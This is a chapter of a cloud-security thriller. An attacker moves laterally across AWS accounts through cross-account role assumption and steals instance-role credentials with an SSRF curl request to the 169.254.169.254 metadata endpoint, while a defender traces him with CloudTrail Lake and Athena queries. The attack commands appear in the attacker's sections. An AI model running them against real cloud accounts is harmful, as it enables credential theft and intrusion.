# Chapter 3: Lateral

---

3:22 AM. Thursday.

VEGA saw the `StartLogging` event at 3:18 AM. Four minutes earlier.

Not because he was staring at a dashboard — he'd written his own watcher. A simple loop: every five minutes, check if the trail was logging. If it flipped from `false` to `true`, that meant someone was home.

Whoever re-enabled it responded in eleven minutes, at 2 AM on a Thursday.

VEGA closed his laptop lid halfway, thinking. Most companies, you disable logging and nothing happens for days, sometimes never. He'd tested this pattern across a dozen environments. The average response time to `StopLogging` was seventy-two hours. The median was "never detected."

"She's good," he said to his empty apartment. One person, clearly: the API calls came from a single principal, and the detection Lambda had one author's fingerprints all over it. Consistent coding style. Consistent query patterns. Elegant, but alone.

He'd anticipated this. `StopLogging` was a *test*, less to blind defenders than to measure response time. Now he knew: someone was watching, and they were fast.

Time to move laterally.

VEGA had already mapped the cross-account trust relationships. The `spoke-001` role in `prod-payments-037` trusted the hub account's admin role, but more importantly, spoke roles across the organization trusted each other. An architectural shortcut. The payment processor key was a stepping stone, not the destination.

```bash
aws sts assume-role \
    --role-arn arn:aws:iam::293847561029:role/spoke-001 \
    --role-session-name session-20250313 \
    --duration-seconds 21600 \
    --profile meridian
```

```json
{
    "Credentials": {
        "AccessKeyId": "ASIAX3EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "SessionToken": "FwoGZXIvYXdzEBYaDH...",
        "Expiration": "2025-03-13T13:00:00Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAX3EXAMPLE:session-20250313",
        "Arn": "arn:aws:sts::293847561029:assumed-role/spoke-001/session-20250313"
    }
}
```

Account `293847561029` — `dev-platform-012`. The development environment for the platform team. Less monitoring, looser controls, and — VEGA was betting — instances that never got the security hardening treatment production accounts received.

He checked the EC2 instances:

```bash
aws ec2 describe-instances \
    --query "Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens]" \
    --output table \
    --profile dev-platform
```

```
-----------------------------------
|       DescribeInstances          |
+-------------------+--------------+
| i-0a1b2c3d4e5f6a78 | optional    |
| i-0b8c9d0e1f2a3b4c | optional    |
| i-0d5e6f7a8b9c0d1e | required    |
| i-0f2a3b4c5d6e7f8a | optional    |
+-------------------+--------------+

```

Three out of four instances had `HttpTokens` set to `optional`: IMDSv1. That meant metadata credentials could be fetched without a session token, the same vulnerability class exploited in the 2019 Capital One breach via SSRF to `169.254.169.254`.

Six years later. Same misconfiguration.

VEGA didn't need to be on the instance. The `dev-platform-012` account ran an internal dev tool — a lightweight proxy service on an EC2 instance with a URL parameter that accepted arbitrary targets. No authentication. No allowlist. VEGA hit it from his assumed role session through the VPC.

```bash
curl "http://10.2.47.83:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/dev-platform-role"
```

```json
{
    "Code": "Success",
    "LastUpdated": "2025-03-13T03:15:00Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAY7EXAMPLE",
    "SecretAccessKey": "SECRET_EXAMPLE_KEY",
    "Token": "IQoJb3JpZ2luX2Vj...",
    "Expiration": "2025-03-13T09:15:00Z"
}
```

A second set of credentials, independent of the original access key. If Maya revoked `svc-payment-processor` (and she would), he'd still have access through instance role credentials. Redundancy, applied to persistence.

VEGA configured the instance role credentials in a separate profile and continued mapping. The assumed role session had five hours and forty minutes left. The instance credentials would refresh indefinitely. Two clocks — one ticking, one not.

---

3:41 AM. Thursday.

I'm tracing the `AssumeRole` chain through CloudTrail Lake. Now that logging is back on, I can see footprints, but only ones made after I turned the lights back on. The twenty-two minute gap is still a blind spot.

```sql
SELECT
    eventTime,
    eventName,
    recipientAccountId,
    requestParameters
FROM
    event_data_store_id
WHERE
    eventTime > '2025-03-13T02:00:00Z'
    AND eventName = 'AssumeRole'
    AND userIdentity.accessKeyId = 'AKIAIOSFODNN7EXAMPLE'
ORDER BY eventTime ASC
```

The chain unfolds:

```
eventTime                | recipientAccountId | requestParameters.roleArn
-------------------------+--------------------+------------------------------------------
2025-03-13T03:19:00Z     | 293847561029       | arn:aws:iam::293847561029:role/spoke-001
2025-03-13T03:31:00Z     | 384756102938       | arn:aws:iam::384756102938:role/spoke-001
2025-03-13T03:44:00Z     | 561029384756       | arn:aws:iam::561029384756:role/spoke-001
```

Three accounts. They jumped from `prod-payments` into `dev-platform-012`, then `staging-data-019`, then `prod-datalake-031`. Each hop used `spoke-001`. My hub-spoke model is now their highway.

In plain terms: VEGA used one stolen key to unlock doors across a dozen accounts, each one giving him access to the next.

I dig deeper. What did they do in each account?

```sql
SELECT
    eventTime,
    eventName,
    eventSource,
    recipientAccountId,
    requestParameters
FROM
    event_data_store_id
WHERE
    eventTime > '2025-03-13T03:00:00Z'
    AND recipientAccountId IN ('293847561029', '384756102938', '561029384756')
    AND userIdentity.sessionContext.sessionIssuer.arn LIKE '%spoke-001%'
ORDER BY eventTime ASC
```

The pattern makes my chest tight:

- `dev-platform-012`: `DescribeInstances`, `DescribeSecurityGroups` — mapping the network
- `staging-data-019`: `ListBuckets`, `GetBucketPolicy` — inventorying data
- `prod-datalake-031`: `ListBuckets`, `GetBucketAcl`, `GetBucketReplication`, `GetBucketPolicy`

That last set stops me cold. `GetBucketReplication`. They're not just looking at data; they're looking at how data *moves*. They're checking for cross-account replication paths that can move large volumes quietly.

That's not random automation. That's someone who understands AWS data architecture: the fastest way to exfiltrate isn't direct download, it's replication to an account you control while AWS does the copying.

I run a Steampipe query to inventory all S3 replication configurations across the org — Steampipe lets me treat AWS like a database, which at 4 AM is faster than writing Python:

```
+-----------------------------+--------------+-----------+---------------------------+-------------------+
| name                        | account_id   | region    | destination_bucket        | destination_acc...|
+-----------------------------+--------------+-----------+---------------------------+-------------------+
| meridian-txn-archive        | 487291035561 | us-east-1 | meridian-txn-backup       | 561029384756      |
| meridian-datalake-raw       | 561029384756 | us-east-1 | meridian-datalake-replica | 561029384756      |
| meridian-compliance-logs    | 102938475610 | us-east-1 | meridian-compliance-bkp   | 102938475610      |
+-----------------------------+--------------+-----------+---------------------------+-------------------+
```

Three replication rules — all internal. All expected. No external accounts. Yet. But the attacker was mapping this. Learning the topology. Figuring out where to plug in.

---

4:15 AM. I need help.

I've never typed those words before. Not in Slack, not in an incident channel, not to anyone. My instinct is to handle this alone. Not ego; I don't want to burden people at 4 AM, and asking for help means explaining the invisible scaffolding I've built and maintained alone for two years.

But I can't watch 45 accounts and trace an attacker and check S3 replication and audit VPC Flow Logs simultaneously. Not alone. Not at 4 AM.

I open a DM to Kira. She's the senior dev on the payments team. We've talked maybe a dozen times — mostly me pinging her about IAM permissions or her pinging me about why her Lambda can't write to DynamoDB. She's sharp. Notices things. Two months ago, she asked me why the payment service had `s3:*` permissions when it only needed `s3:PutObject` to one bucket. I almost hugged her.

```
Maya: Kira, I know it's 4 AM. I'm sorry. We have an active security
incident in prod-payments. I need someone who understands the payment
service architecture. Can you join #incident-20250313?
```

She responds in three minutes. Three minutes at 4 AM on a Thursday.

```
Kira: On my way. What do you need?
```

I don't know why my eyes sting. Probably sleep deprivation.

She joins the channel. I brief her on CloudTrail events, role chains, timeline. Halfway through, she stops me.

"Wait. You built all of this?" She's not talking about the attacker's path. She's talking about the detection pipeline, the cross-account queries, the EventBridge rules. "This has been running for how long?"

"Two years."

"And nobody else knows how it works?"

I don't answer. She lets the silence do the work, then moves on. She absorbs the rest quickly, then asks the question that hits me like a truck.

"Maya — why can a payment service role assume into dev accounts?"

I stare at the screen.

"Because when I built the hub-spoke model, I optimized for 'make it work' instead of 'least privilege.' I was one person setting up 45 accounts. I took shortcuts so cross-account access would work without me as a bottleneck."

Silence in the channel for ten seconds. Then:

```
Kira: And now?
```

"And now someone found the shortcut."

---

4:47 AM. I'm building a timeline.

CloudTrail Lake is my primary evidence source, but it only covers control-plane API calls. For data-plane activity (actual S3 object access, actual database queries), I need secondary sources: S3 server access logs, RDS query logs, and VPC Flow Logs.

I query S3 server access logs for the payments transaction bucket. The access logs land as flat files in a logging bucket — I'd set up an Athena table over them months ago for exactly this kind of ad-hoc forensics:

```sql
-- Athena query over S3 server access logs
SELECT
    bucket_name,
    requester_arn,
    key,
    operation,
    request_time,
    remote_ip
FROM
    s3_access_logs_db.meridian_txn_archive_logs
WHERE
    bucket_name = 'meridian-txn-archive'
    AND parse_datetime(request_time, 'dd/MMM/yyyy:HH:mm:ss Z') > timestamp '2025-03-13 05:00:00'
    AND remote_ip = '98.47.216.103'
ORDER BY request_time ASC
```

They ran `ListObjects` and then `GetObject` on fourteen files: transaction records from the last three months.

But here's what I almost miss: the `GetBucketReplication` call wasn't just reconnaissance. I check the bucket policy for `meridian-datalake-raw`:

```bash
aws s3api get-bucket-policy --bucket meridian-datalake-raw \
    --profile prod-datalake --output json | jq '.Policy | fromjson'
```

The policy hasn't been modified. Yet. But the attacker now knows exactly how replication is configured — what IAM roles are used, what destination accounts are trusted, what the bucket policy allows. They're building a playbook.

I almost miss this because I'm focused on the `AssumeRole` chain, the IAM control-plane movement. Attackers don't move only through IAM; they use data-plane APIs too. `GetObject` doesn't appear in CloudTrail management events. You need S3 data events enabled, which costs extra, which Erik said was "not justified this quarter."

Not justified this quarter. I should get that tattooed somewhere.

Kira is running her own queries — checking which Lambda functions in the payments account have been invoked recently, cross-referencing with the deployment history. Nothing anomalous there. The attacker isn't touching the application layer. They're living entirely in the infrastructure layer — AWS APIs, IAM roles, S3. Living off the land, using the cloud's own tools as their toolkit. No malware to detect. No binaries to scan. Just API calls that look almost — but not quite — like normal operations.

I run another Steampipe query to map all cross-account trust relationships for the `spoke-001` role.

Forty-five accounts. Every single one has `spoke-001`. Every single one trusts the hub. And the hub trusts every single spoke. My architecture — the thing I built alone, late at night, to make everything work — is the attack surface.

5:03 AM. The sky outside my window is starting to lighten. Kira is still in the channel, still sharp, still asking the right questions. I'm mapping an attacker who's been inside our environment for two weeks, who's studied our architecture as carefully as I built it.

And I'm starting to realize: they might understand it better than I do.

Because they had time to look at all of it. I never do. I'm always putting out fires, always triaging the next Prowler finding, always fixing someone's IAM permissions at midnight. I never had time to step back and look at my own architecture the way an attacker would.

Until now.
